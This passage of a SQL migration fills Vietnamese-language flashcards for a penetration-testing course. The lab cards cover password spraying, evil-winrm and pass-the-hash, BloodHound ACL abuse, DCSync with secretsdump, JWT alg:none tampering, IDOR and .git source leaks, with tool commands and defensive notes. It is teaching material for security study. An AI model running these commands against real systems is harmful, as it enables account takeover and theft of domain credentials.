**Sau khi bẻ được password:** dùng ngay để enumerate sâu hơn (`netexec smb ... --users --groups --shares`, `bloodhound-python`) — đây chính là bước tiếp theo trong chuỗi Kịch bản B.

**Phòng vệ (report):** bật bắt buộc Kerberos preauthentication cho mọi tài khoản (mặc định đã bật, chỉ tắt nếu admin cấu hình sai).'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 6 — AD enum đến AS-REP Roasting';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment: Password Spraying → WinRM Shell

Khớp mục 15 + mục 16 + Kịch bản B bước 5, 7 (mục 25):

**Password Spraying** (sau khi có danh sách user từ enumeration mục 14): thử 1 password phổ biến trên nhiều user (tránh lockout):
```bash
netexec smb <target-ip> -u users.txt -p ''Password1'' --continue-on-success
```

**Dùng credential tìm được để enumerate sâu hơn:**
```bash
netexec smb <target-ip> -u <user> -p <password> --users --groups --shares
bloodhound-python -u <user> -p <password> -d corp.local -ns <target-ip> -c All
```

**Vào shell qua WinRM** (mục 16, Kịch bản B bước 7):
```bash
evil-winrm -i <target-ip> -u <service-user> -p <password>
```
Nếu có hash NTLM thay vì password: `evil-winrm -i <target> -u <user> -H <nthash>` (Pass-the-Hash).

**Lưu ý khi làm bài:** luôn ghi lại máy nào đã compromise bằng tài khoản/kỹ thuật gì — nội dung cần cho report (mục 24), và tránh lặp lại công việc khi quay lại sau.

**Phòng vệ:** account lockout policy hợp lý, giám sát log đăng nhập sai hàng loạt; cho lateral movement — bật LAPS (password local admin riêng từng máy) và Credential Guard.'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 7 — Password spraying đến shell qua WinRM';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment: BloodHound → Domain Admin (GenericAll/Backup Operators)

Khớp mục 14 (BloodHound enum) + mục 17 (ACL Abuse) + Kịch bản B bước 5-8 (mục 25):

**Thu thập dữ liệu:**
```bash
bloodhound-python -u <user> -p <password> -d corp.local -ns <target-ip> -c All
```
Nạp vào BloodHound GUI, tìm đường ngắn nhất từ user hiện có tới Domain Admin.

**ACL Abuse (mục 17) — các quyền nguy hiểm BloodHound tự tìm ra:**
- `GenericAll`/`GenericWrite` trên 1 user khác → đổi password hoặc thêm SPN cho họ rồi Kerberoast
- `WriteDACL` → tự cấp thêm quyền cho chính mình
- `AddMember` trên 1 group → tự thêm mình vào group quyền cao hơn

Công cụ: `bloodyAD`, `impacket-owneredit`, `impacket-dacledit`.

**Lưu ý:** tài liệu KHÔNG đề cập cụ thể kỹ thuật **Backup Operators abuse** (lợi dụng quyền `SeBackupPrivilege` để backup NTDS.dit) — chỉ có ACL Abuse nói chung (GenericAll/WriteDACL/AddMember) và DCSync.

**DCSync** (nếu có quyền `Replicating Directory Changes`): `secretsdump.py <domain>/<user>:<pass>@<dc-ip>` — lấy toàn bộ hash domain kể cả `krbtgt`.

**Cách học đúng theo tài liệu:** "đừng học thuộc tên kỹ thuật. Mỗi lần làm lab, hỏi: BloodHound đang gợi ý đường nào từ user của mình tới Domain Admin, và vì sao đường đó tồn tại?".'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 8 — BloodHound đến Domain Admin';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment: IDOR + JWT alg:none Tampering on API

Khớp mục 5 (JWT) + mục 8 (IDOR) + mục 9 (API Security):

**IDOR — test có hệ thống (mục 8):**
1. Tạo 2 tài khoản A và B
2. Đăng nhập A, lấy ID tài nguyên (`GET /api/invoices/1024`)
3. Đăng nhập B, dùng session B gọi API với ID của A (`GET /api/invoices/1025`)
4. B xem/sửa được dữ liệu A → IDOR

**JWT alg:none (mục 5):** một số thư viện JWT cũ chấp nhận token không ký nếu header khai `"alg":"none"` → sửa payload tùy ý mà không cần biết secret.
```bash
python3 jwt_tool.py <token> -X a   # thử tấn công alg:none
python3 jwt_tool.py <token> -C -d wordlist.txt   # dò secret HS256 yếu
```
Cách tiếp cận: luôn decode trước (jwt.io/jwt_tool.py) xem claim gì (role, user id, exp) rồi mới quyết định hướng — sửa claim trực tiếp, đổi alg, hay bẻ secret.

**Trên API (mục 9):** mở DevTools → Network xem request XHR/Fetch, test trực tiếp qua Burp/curl (đừng chỉ test qua UI) — "thiếu kiểm tra quyền ở từng endpoint riêng lẻ" là lỗi API hay gặp nhất, kết hợp đúng với JWT bị tamper.

**Phòng vệ:** luôn kiểm tra đúng thuật toán phía server (không tin `alg` client gửi), check quyền ở backend cho MỌI request (IDOR), không chỉ ẩn UI.'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 9 — IDOR + JWT tampering trên API';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment: Capstone — nmap → .git leak → git-dumper

Khớp gần nhất với **Kịch bản D — Whitebox/Source Code Review** (mục 25) kết hợp với mục 20 (`.git/` leak) + mục 10 (Source Code Review source→sink):

**Bước phát hiện `.git` leak (mục 20):** `/.git/` nếu lộ, dùng **git-dumper** hoặc GitTools để tải toàn bộ source code + lịch sử commit.

**Sau khi có source code, lập bản đồ trước khi đọc tràn lan (Kịch bản D bước 1-2):**
```bash
find . -type f -name "*.php" | head -50
cat package.json 2>/dev/null
grep -rn "ROUTE\|@app.route\|Route::" . 2>/dev/null       # tìm file định nghĩa route
grep -rn "eval\|exec\|system\|shell_exec\|passthru" .   # sink nguy hiểm
grep -rn "query(\|execute(" . | grep -v "prepare\|bind"   # SQL không dùng prepared statement
```

**Bước 3 — lần ngược source→sink (mục 10):** `grep -n "\$_GET\|\$_POST\|request\.\(args\|form\|json\)" <file>` — nếu biến ở sink trùng biến từ request, không qua sanitize → lỗ hổng thật.

**Bước 4 — config/dependency (chỉ whitebox mới thấy):** `cat .env`, `cat composer.json package.json requirements.txt`, `grep -rn "SECRET_KEY\|DEBUG.*=.*True" .`

**Bước 5 — xác nhận bằng khai thác thật:** whitebox không dừng ở đọc code, vẫn phải gửi request thật để xác nhận đúng dự đoán.

**Lưu ý:** tài liệu không ghép sẵn 1 walkthrough đúng tên "nmap → git leak → git-dumper → full chain" theo thứ tự — cần tự ghép Kịch bản A (nmap/web enum) với đoạn `.git` leak (mục 20) và quy trình whitebox (Kịch bản D, mục 10).'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 10 — Capstone: full chain từ recon đến root';
